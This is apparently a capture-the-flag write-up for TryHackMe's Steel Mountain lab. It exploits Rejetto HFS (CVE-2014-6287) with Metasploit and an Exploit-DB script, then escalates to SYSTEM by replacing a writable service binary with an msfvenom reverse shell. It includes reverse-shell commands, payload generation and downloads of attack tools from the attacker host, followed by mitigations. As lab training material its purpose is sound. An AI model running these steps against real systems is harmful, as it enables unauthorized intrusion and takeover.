# TryHackMe - [Steel Mountain](https://tryhackme.com/room/steelmountain) Write-Up

"In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator."

The first step I always find useful is creating a directory for the room, and opening a terminal as root at the location (/home/kali/Desktop/CTF/TryHackMe/SteelMountain/).

## Task 1 : Introduction

**1) Who is the employee of the month?**

I am going to start recon for this CTF by running a nmap scan on my assigned MACHINE_IP (10.10.98.28) for the room. I will be looking for open ports that may have vulnerabilities, so that I can take advantage of them using Metasploit.

```
nmap 10.10.98.28 -p- -A -vv
```

The scan I chose to run looks at all ports and runs an aggressive scan with very verbose information. It can sometimes be useful to output this in a grepable format by adding -oG filename.

Here is what I managed to find with my scan that I believe will be useful:

1. Operating System: Windows Server 2008 R2 - 2012
1. Interesting open ports:
* 8080 (HttpFileServer httpd 2.3)
* 3389 (RDP)
* 80 (HTTP)
* 445 (SMB)
* 139 (SMB)
* 135 (MSRPC)

After seeing the ports, I am going to start by checking out the website on port 80 to see if it has any information on employees.

After navigating to 10.10.98.28 to view the site, we see that we're in luck! Kind of... We see the employee but there is no name! Usually I would recommend doing some OSINT using a [Reverse Image Search](http://imgops.com/) to try and find more info, but let's check the source code first. 

```html
<img src="/img/BillHarper.png" style="width:200px;height:200px;"/>
```

Bingo! We got the answer for #1. It is common for information to be given away in the name of files.

## Task 2 : Initial Access

**1) Scan the machine with nmap. What is the other port running a web server on?**

We already found this file server in Task 1 with our nmap scan.

**2) Take a look at the other web server. What file server is running?**

Our nmap revealed that this was HttpFileServer httpd 2.3, but We still need to find the vendor. Let's navigate to the MACHINE_IP:8080 and see if we can find it in the source. 

```html
<a href="http://www.rejetto.com/hfs/">HttpFileServer 2.3</a>
```

It looks this is a Rejetto HTTP File Server (HFS) using httpd 2.3, hopefully it is vulnerable because this could be a point of access.

**3) What is the CVE number to exploit this file server?**

Now we need to check [Exploit-DB](https://www.exploit-db.com/) with the information we have about the Server.

You could also use searchsploit for rejetto.

We're in luck, it looks like we can use [Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)](https://www.exploit-db.com/exploits/34668) using **CVE-2014-6287**. If it doesn't work... there appears to be a newer exploit using python. However, we are going to use the metasploit one because it fits the scope of the room.

**4) Use Metasploit to get an initial shell. What is the user flag?**

Looks like it's time to hop over to Metasploit and get a shell on this server!

Lets go back to that root terminal we opened earlier in the Steel Mountain directory, and run metasploit to search for the related exploit. This will allow us to get a shell and find that user flag.

```linux
msfconsole
search rejetto
[*] Using exploit/windows/http/rejetto_hfs_exec
msf6 exploit(windows/http/rejetto_hfs_exec) > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution

use rejetto
show options
```

Looks like we are in luck and found the rejetto http exploit. Next, check and see what options are needed to launch this exploit.

I see that the payload LHOST needs to be changed to my tun0 TryHackMe OpenVPN IP, the RPORT needs to be shifted from 80 to 8080, and the RHOSTS needs to be set to the MACHINE_IP.

After setting all the options using SET OPTION VALUE, run exploit and see if you can get a shell.

```linux
[*] Started reverse TCP handler on 10.6.40.191:4444 
[*] Using URL: http://0.0.0.0:8080/uZLdlnYXXTAxk
[*] Local IP: http://10.0.2.15:8080/uZLdlnYXXTAxk
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /uZLdlnYXXTAxk
[*] Sending stage (175174 bytes) to 10.10.98.28
[*] Meterpreter session 1 opened (10.6.40.191:4444 -> 10.10.98.28:49288) at 2021-02-14 04:00:06 -0500
[!] Tried to delete %TEMP%\vKBVgSnUET.vbs, unknown result
[*] Server stopped.

meterpreter > 
```

SUCCESS! Let's now run a quick ls -a to see where we are and what's in the directory.

Unfortunately, I do not see any txt flags here and we appear to be in the startup directory.  So let's fix that by navigating to the Users directory.

```linux
cd \Users\
```

You could probably assume the user is bill but lets run an ls here to see the different users, since we will want to know of any admin accounts.

Notable Users:
* Bill
* Administrator

Let's now cd to bill and check his desktop/documents for the flag.

Looks like user.txt is located on the desktop. Go ahead and concatenate(cat) it to get the flag.

## Task 3 : Privilege Escalation

Now we are going to need the powershell script [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). The script's purpose is for evaluatuating a Windows machine and determining abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations." 

Luckily for us, we can use this to find a potential usage of a misconfiguration to escalate our priviledges.

Let's background our meterpreter session (background) and open up another terminal session as root in our steel mountain directory. 

We can use curl to download the raw file of this powershell.

```linux
curl -O -L https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```

Now we need to upload PowerUp to the server. Luckily, we already have a backgrounded shell. First, make sure that your meterpreter is in the directory of your PowerUp that you will be uploading with ls.

You can then open up the session for your shell that you backgrounded earlier.

```linux
msf6 exploit(windows/http/rejetto_hfs_exec) > sessions -1
[*] Starting interaction with 1...

meterpreter > upload PowerUp.ps1
[*] uploading  : PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): PowerUp.ps1 -> PowerUp.ps1
[*] uploaded   : PowerUp.ps1 -> PowerUp.ps1
```

Now we must load the powershell extension and enter into the shell.

```linux
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > 
```

**1) Take close attention to the CanRestart option that is set to true. What is the name of the name of the service which shows up as an unquoted service path vulnerability?**

Now that we have successfully launched powershell, lets run our PowerUp and Invoke-AllChecks to look for the **CanRestart** option being **true** along with the service having **unquoted service paths**.

```ps
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```

Looking through we can see that **AdvancedSystemCareService9** applies to both criteria we were looking for. The unquoted service could be exploited, but we're just going to abuse the weak file permissions to restart the service on the system. Go ahead and close the Powershell session with CTRL+C to get back to meterpreter.

**2) What is the root flag?**

Since the directory (C:\Program Files (x86)\IObit\Advanced SystemCare\) to the application is write-able, we can copy our infected binary there with meterpreter. Now, we just need to swap the actual application with our malicious version. We can then restart the service, and run it to get root for access to the flag.

To create this infected binary reverse shell we are going to use msfvenom to generate our payload. 
* We set the payload to a windows reverse tcp shell.
* We set the LHOST to our OpenVPN Tun0 IP.
* We need a new port since we are using 4444, so I will just use 4445.
* We should encode it with [x86/shikata_ga_nai](https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html).
* We need to format as an executable because that is what the service is running as.
* We need to specify the output name to the service we will be replacing.

```
msfvenom -p windows/shell_reverse_tcp LHOST=Tun0-IP LPORT=4445 -e x86/shikata_ga_nai -f exe -o ASCService.exe
```

Once you have generated this payload in your SteelMountain directory, hop back over to the meterpreter session. 
* We are going to first upload our infected binary.
* We will then execute a cmd and use sc to stop the legitimate service.
* We will then swap the services using the cmd.

```linux
meterpreter > upload ASCService.exe
[*] uploading  : ASCService.exe -> ASCService.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): ASCService.exe -> ASCService.exe
[*] uploaded   : ASCService.exe -> ASCService.exe
meterpreter > execute -f cmd.exe -i -H.
Process 3136 created.
Channel 4 created.

Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
Overwrite \Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe? (Yes/No/All): yes
yes
        1 file(s) copied.
```

Now that we have swapped the files, we want to open a netcat listener on the port (I used 4445) before restarting the service.

```linux
nc -lvnp 4445
```

Finally, cross your fingers and restart the service using the cmd session.

```cmd
sc start AdvancedSystemCareService9
```

WIN! Hop back over to that netcat listener and run a quick whoami.

```cmd
listening on [any] 4445 ...
connect to [10.6.40.191] from (UNKNOWN) [10.10.98.28] 49370
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

We have achieved system which is essentially root for windows. Go and find that flag! A quick way to find it is by using the below cmd command (I added a star at the end because sometimes they are "root.txt.txt"). You can use type root.txt to view it in the cmd. If you accidentally close your netcat session (oops!), just start the service again with your meterpreter cmd session.

```
dir "\root.txt*" /s
type filepath\root.txt
```

## Task 4: Access and Escalation Without Metasploit

One of the best ways to get better at CTFs like this is to find alternative solutions. There's almost always plenty of other options/paths you can take and you can learn a lot from finding new routes.

For this one let's backtrack to the other exploit we saw in Task 2. We will be using the same CVE, but a new [exploit](https://www.exploit-db.com/exploits/39161) with python. We saw this method earlier in Exploit-DB.

What will be needed for this exploit and priviledge escalation:
* Open 3 terminal windows, and run them in the order listed.
* Download [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release) binary.
* Download [Netcat static](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe) binary.
* Download The python script from exploit-db (I put all 3 of these files in the SteelMountain directory).
* Edit the python script with your tun0 OpenVPN IP and the port you will be listening on (make sure not to use one already in use).
* Make sure that your netcat binary matches up with the nc.exe in the exploit script and that all required files/terminals are in the same SteelMountain folder.
* The first terminal will run our python http server.

```
python -m SimpleHTTPServer 80
```

* The second terminal will be our static netcat binary listening on the port we selected(4449).

```
nc -lvnp 4449
```

* The third terminal will be used to execute our attack by running the exploit on the MACHINE_IP for port 8080 of the room because that is the port assosciated with the vulnerable file server.

```
python 39161.py 10.10.98.28 8080
```

This exploit script will have to be ran twice. The first run is used to pull the static netcat binary to the target and the second is execution of the payload for callback to the listener.

Once you get a win on the shell, we can move on to looking for a misconfigured service.

**1) What powershell -c command could we run to manually find out the service name?**

This is a good cmdlet to know, but not really useful due to winPEAS. winPEAS will tell you the service to target, but this is an option for manually finding the service.

It is time to use winPEAS for some awesome script priviledge escalation. Run a powershell script to get winPEAS from the HTTPServer you are hosting using your tun0 IP.

```
powershell -c Get-Service #manually find service
powershell -c wget "http://Tun0-IP/winPEAS.exe"
```

Run winPEAS and you will see that it is pointing towards those unquoted paths from earlier for the same service.

From here, rinse and repeat the steps that were used to stop the service, swap the binaries, and restart the service while listening on the port associated with the infected binary.

### Congratulations! You're done with the room!

## Mitigations

### Initial Access

* Patch Rejetto to 2.4 RC6

This will fix both initial access exploits used in the room.

### Privilege Escalation

* Fix the misconfiguration for auto restart by setting it to false. 
* Fix the [unquoted service paths](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae) by enclosing the file path with quotes. This is required because the service file path has spaces in it. 
* Disallow writing by a user to service paths.

### Cleanup

* Kill the running shells PIDs and remove the shells.
* Remove the imposter service file and replace with the correct service binary.
* Remove winPEAS, nc, and PowerUp.

If I did not know what payload was used here that replaced the service, I would recommend to reimage the device.

Feel free to reach out to me on [Twitter](https://twitter.com/R_G_9_n) if you have any questions.
